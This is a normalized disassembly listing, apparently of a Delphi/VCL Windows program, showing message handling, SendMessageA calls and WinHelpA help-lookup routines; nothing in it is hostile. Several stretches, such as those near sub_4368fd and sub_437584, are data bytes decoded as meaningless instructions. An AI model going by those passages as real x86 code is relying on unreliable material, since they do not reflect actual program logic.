sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403fa8
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404268
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c0ac
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404268
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404508
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404268
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404508
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404190
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_404270
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_443708
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403454
push ebp
call sub_436278
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404268
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404190
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404190
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404328
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_43652c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436600
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_443708
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436607
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_436630
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_436658
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_436698
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43667c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_443708
push eax
call SendMessageA
sub_4366c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4366e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4366f0
retn
sub_4367f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449334
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_43682c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436851
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436858
retn
sub_4368fd
push 0x68e70043
inc ebx
add cl dh
push 0x68950043
inc ebx
add [ ebp - 0x5affbc98 ] bl
push 0x68ad0043
inc ebx
add [ ebp - 0x42ffbc98 ] dh
push 0x68c50043
inc ebx
add ch cl
push 0x68d50043
inc ebx
add [ ebp + 0x68 ] dh
out 0x68 eax
cmp bh ah
push 0x200043
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ ebp + 0x68 ] bh
inc ebx
add [ ebp - 0x72ffbc98 ] al
push 0x686d0043
mov ebp 0xc5004368
push 0x68cd0043
inc ebx
add ch dl
push 0x68750043
cmp bh ah
push 0x200043
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
lea ebp [ eax + 0x43 ]
add [ ebp + 0x68 ] ch
cmp bh ah
push 0x200043
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x69
inc ebx
add [ eax + 0x69 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add ah ah
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_436a10
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436ac5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fa8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404040
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436acc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404328
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_436ae0
push ebx
mov ebx eax
mov eax ebx
call sub_436e10
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4056c4
sub_436b1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436b83
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_436a10
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b8a
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_436b94
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_436c1c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_436b08
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404328
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c23
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_436c2f
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_436cb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_437354
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436cbe
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_436a10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_436cc4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436dbc
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_436a10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408db8
mov eax ebx
call sub_437354
test al al
je r-xdata
mov ecx sub_436864
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436dc3
lea eax [ ebp - 0x1c ]
call sub_403fa8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_436a10
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_4372ac
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403ffc
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404468
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_436e2c
push ebx
mov ebx eax
mov eax ebx
call sub_436e10
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4056c4
pop ebx
retn
mov eax rw-data
call sub_4056c4
sub_436e5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_436eb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436ebb
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_436a10
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_436ec4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436fba
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408d78
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_436a10
mov eax ebx
call sub_437354
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436fc1
lea eax [ ebp - 0x110 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404218
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_4372ac
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404218
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_436fd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43703a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437041
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_436a10
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43704c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4370cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_436a10
mov eax ebx
call sub_437354
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4370d3
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4372ac
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4370dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4371c7
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_437354
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4371ce
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fcc
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407f50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_4372ac
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407f50
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403ffc
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_436a10
mov eax [ ebp - 0x14 ]
call sub_404468
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_4371dc
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087dc
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_437237
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087b8
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_4372ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_437322
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_437290
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437329
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407c78
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_437338
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_437354
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_437290
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_437334
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_437338
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_4373b0
sub_4373b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43742d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_436e10
call GetTickCount
mov ebx eax
push 0x0
call sub_406210
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_436a10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437434
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43743c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40357c
call sub_4056dc
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_437484
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4374b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43751e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437525
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4056c4
mov eax rw-data
call sub_4056c4
mov eax rw-data
call sub_4056c4
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_4056c4
mov eax [ rw-data ]
call sub_436ae0
sub_437528
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43757a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437581
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43743c
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4056c4
mov edx eax
mov eax [ rw-data ]
call sub_425220
sub_437584
mov [ ebp + 0x43 ] dh
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
lodsb [ esi ]
movsb [ edi ] [ esi ]
inc ebx
add [ ebx ] cl
push esp
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add ah bh
movsb [ edi ] [ esi ]
inc ebx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x77ffbc5b ] bl
movsb [ edi ] [ esi ]
inc ebx
add [ esp - 0x5c77ffbd ] al
inc ebx
add [ eax - 0x5b ] al
inc ebx
add [ ebx + 0x43 ] cl
add [ eax - 0x5bffbc5c ] ah
movsb [ edi ] [ esi ]
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 + 0x76 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x76 ] si
inc ebx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
movsb [ edi ] [ esi ]
jne r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + 0x76 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
insd
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
add ah dh
ja r-xdata
inc esp
jb r-xdata
add [ esp - 0x5a93ffbd ] ch
inc ebx
outsd
insb
jae r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ 0xffffffffa4fc0043 ] cl
inc ebx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx + 0x43 ] al
add [ eax - 0x7bffbc5c ] cl
movsb [ edi ] [ esi ]
inc ebx
add [ eax - 0x13ffbc5d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + 0x43 ] dh
add [ eax + eax ] dh
jae r-xdata
inc ebx
add [ esp - 0x59efffbd ] ah
add [ eax ] al
add [ eax ] al
mov eax 0xa0004376
xor al 0x40
add [ 0xffffffffa4fc0043 ] cl
add [ eax ] al
hlt
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x437704c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
ja r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x540b0043 ] ch
mov al [ 0xffffffffa40043a4 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x340043 ] al
jb r-xdata
inc ebx
add ah ah
movsd [ edi ] [ esi ]
inc ebx
add [ eax + 0x400043a3 ] cl
movsd [ edi ] [ esi ]
inc ebx
add [ ebx + 0x43 ] cl
add al dh
movsd [ edi ] [ esi ]
inc ebx
add [ esp - 0x59efffbd ] ah
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ esp + esi + 0x34a80040 ] dh
movsb [ edi ] [ esi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4c ] si
ja r-xdata
add [ 0x54160043 ] bl
inc edx
popad
jae r-xdata
inc ebx
add [ esp - 0x5b53ffbd ] ah
inc ebx
add [ ebp + 0x43 ] ch
add [ eax + eax ] bh
add [ eax ] al
adc al 0x76
inc ebx
add [ eax + 0xc004034 ] ah
movsd [ edi ] [ esi ]
inc ebx
add [ eax - 0x5bffbc5c ] ah
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
mov esp 0x3004375
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x6004375 ] bh
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ eax ] dl
test al 0x43
add [ esp - 0x5c77ffbd ] al
inc ebx
add al cl
cmpsb [ esi ] [ edi ]
inc ebx
add [ ebx + 0x43 ] cl
add [ eax - 0x5bffbc5c ] ah
movsb [ edi ] [ esi ]
inc ebx
add [ esp - 0x58dbffbd ] ch
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ebp + 0x43 ] ch
add [ 0x54140043 ] bl
inc esp
jb r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] dl
cmpsb [ esi ] [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x54 ] si
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi + 0x79 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
